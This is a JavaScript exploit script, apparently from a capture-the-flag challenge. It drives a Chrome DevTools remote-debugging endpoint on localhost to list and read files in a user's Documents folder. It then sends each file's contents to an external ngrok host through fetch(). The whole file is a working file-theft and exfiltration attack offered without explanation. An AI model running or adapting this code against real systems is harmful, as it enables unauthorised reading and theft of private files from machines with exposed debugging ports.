const selfURL = "http://f56e216fa766.ngrok.io";

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function report(data) {
  fetch(`${selfURL}/${encodeURIComponent(data)}`);
}

async function openPage(url) {
  const baseUrl = "http://localhost:5000";
  const devtoolsURL = `${baseUrl}/json/new?${encodeURIComponent(url)}`;
  const res = await fetch(devtoolsURL);
  const data = await res.json();
  await sleep(500); // Wait for the page to finish loading
  return data.webSocketDebuggerUrl;
}

function wsPromise(wsURL, onopen) {
  return new Promise((resolve, reject) => {
    window.ws = new WebSocket(wsURL);

    ws.onerror = (e) => {
      report("[ws.onerror] " + JSON.stringify(e));
      reject(e);
    };

    ws.onmessage = (e) => { resolve(e); };
    ws.onopen = () => ws.send(onopen);
  });
}

const documentsDir = "file:///home/inmate/Documents";

(async () => {
  var wsURL = await openPage("http://example.com");

  var res = await wsPromise(
    wsURL,
    JSON.stringify({
      id: 0,
      method: "Page.navigate",
      params: {
        url: `view-source:${documentsDir}`,
      },
    })
  );
  console.log("[Page.navigate]");
  console.log(res);

  var res = await wsPromise(
    wsURL,
    JSON.stringify({
      id: 0,
      method: "Runtime.evaluate",
      params: { expression: "document.body.textContent" },
    })
  );
  console.log("[Runtime.evaluate]");
  console.log(res);

  var html = JSON.parse(res.data).result.result.value;
  console.log("[html]")
  console.log(html)

  var doc = new DOMParser().parseFromString(html, "text/html");
  var scripts = Array.from(doc.querySelectorAll("script"));

  // On non-headless chrome, this should be 5
  var fileScripts = scripts.slice(2);

  var filenames = fileScripts.map(
    (x) => x.text.match(/addRow\("(?<filename>.*?)".*/).groups.filename
  );

  console.log("[filenames]")
  console.log(filenames);

  for (const filename of filenames) {
    var wsURL = await openPage(`${documentsDir}/${filename}`);
    var res = await wsPromise(
      wsURL,
      JSON.stringify({
        id: 0,
        method: "Runtime.evaluate",
        params: { expression: "document.body.textContent" },
      })
    );
    console.log("[Runtime.evaluate]");
    console.log(res);
    var file = JSON.parse(res.data).result.result.value
    report(`[${filename}] ${file}`);
  }
})();
